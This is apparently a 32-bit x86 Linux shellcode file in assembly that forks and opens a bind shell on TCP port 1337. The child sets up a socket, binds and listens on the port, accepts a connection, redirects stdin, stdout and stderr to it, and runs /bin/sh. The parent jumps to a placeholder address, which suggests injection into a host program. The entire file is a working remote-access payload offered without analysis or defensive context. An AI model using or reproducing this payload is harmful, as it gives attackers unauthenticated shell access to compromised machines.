BITS 32

; open up port 1337 with a shell

	; fork
	mov eax, 2	
	int 0x80
	
	test eax, eax
	jne parent

	; socket(PF_INET, SOCK_STREAM, 0)
	mov eax, 102
	mov ebx, 1
	cdq
	push edx
	push BYTE 0x1
	push BYTE 0x2
	mov ecx, esp
	int 0x80

	mov esi, eax ; saved the return filedescriptor

	; bind(esi, {AF_NET, htons(1337), 0}, 16)
	mov eax, 102
	mov ebx, 2
	push edx
	push WORD 0x3905
	push WORD bx
	mov ecx, esp
	push BYTE 16
	push ecx
	push esi
	mov ecx, esp
	int 0x80

	; do jump if failure here
	test eax, eax
	jl parent

	; listen
	mov eax, 102
	mov ebx, 4
	push 4
	push esi
	mov ecx, esp
	int 0x80

	; accept
	mov eax, 102
	mov ebx, 5
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0x80

	; dup2 socketfd over stdin, stdout, stderr
	mov ebx, eax
	mov eax, 63
	xor ecx, ecx
	int 0x80
	mov eax, 63
	inc ecx
	int 0x80
	mov eax, 63
	inc ecx
	int 0x80

	; execve

	mov eax, 11	
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80

parent:
	mov eax, 0x00112233
	jmp eax
